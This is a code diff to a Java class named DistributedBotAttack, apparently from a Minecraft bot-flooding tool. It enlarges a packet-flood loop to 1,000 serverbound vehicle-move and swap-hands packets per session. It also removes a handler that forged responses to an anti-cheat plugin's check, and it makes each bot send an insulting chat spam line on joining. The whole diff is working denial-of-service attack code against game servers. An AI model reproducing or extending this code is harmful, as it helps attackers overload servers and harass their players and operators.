@@ -14,11 +14,18 @@ import java.util.concurrent.atomic.AtomicInteger;
 import co.akarin.endminecraftultra.Protocol.ACP;
 import co.akarin.endminecraftultra.Protocol.MCForge;
 import com.github.steveice10.mc.protocol.MinecraftProtocol;
+import com.github.steveice10.mc.protocol.data.game.entity.metadata.Position;
+import com.github.steveice10.mc.protocol.data.game.entity.object.Direction;
+import com.github.steveice10.mc.protocol.data.game.entity.player.PlayerAction;
 import com.github.steveice10.mc.protocol.packet.ingame.clientbound.*;
 import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.ClientboundMoveVehiclePacket;
+import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundChatPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCustomPayloadPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
+import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundMoveVehiclePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerPosPacket;
+import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundPlayerActionPacket;
+import com.github.steveice10.mc.protocol.packet.login.serverbound.ServerboundHelloPacket;
 import com.github.steveice10.packetlib.ProxyInfo;
 import com.github.steveice10.packetlib.Session;
 import com.github.steveice10.packetlib.event.session.*;
@@ -107,8 +114,9 @@ public class DistributedBotAttack extends IAttack{
         if(taskThread!=null) taskThread.stop();
     }
     public void packetFlood(Session session){
-        for (int i=0;i<600;i++){
-            session.send(new ClientboundMoveVehiclePacket(0.01,0,0,0,0.01F));
+        for (int i=0;i<1000;i++){
+            session.send(new ServerboundMoveVehiclePacket(0.01,0,0,0,0.01F));
+            session.send(new ServerboundPlayerActionPacket(PlayerAction.SWAP_HANDS,new Position(0,0,0), Direction.EAST));
         }
         mainUtils.log("Flooder","Packet sending");
     }
@@ -163,21 +171,11 @@ public class DistributedBotAttack extends IAttack{
                     long id = keepAlivePacket.getPingId()+System.currentTimeMillis();
                     e.send(new ServerboundKeepAlivePacket(id));
                 }
-                if (packet instanceof ClientboundCustomPayloadPacket) {
-                    ClientboundCustomPayloadPacket packet1=(ClientboundCustomPayloadPacket)packet;
-                    switch(packet1.getChannel()) {
-                        case "AntiCheat3.4.3":
-                            String code=acp.uncompress(((ClientboundCustomPayloadPacket) packet).getData());
-                            byte[] checkData=acp.getCheckData("AntiCheat.jar",code,new String[] {"44f6bc86a41fa0555784c255e3174260"});
-                            e.send(new ServerboundCustomPayloadPacket("AntiCheat3.4.3",checkData));
-                            break;
-                        default:
-                    }
-                }
                 if(packet instanceof ClientboundLoginPacket){
                     e.setFlag("join",true);
                     mainUtils.log("Client","[连接成功]["+username+"]");
                     e.send(new ServerboundKeepAlivePacket(System.currentTimeMillis()));
+                    e.send(new ServerboundChatPacket("WDNMDWDNMDWDNMDWDNMDWDNMDWDNMD"));
                 }
             }
             @Override
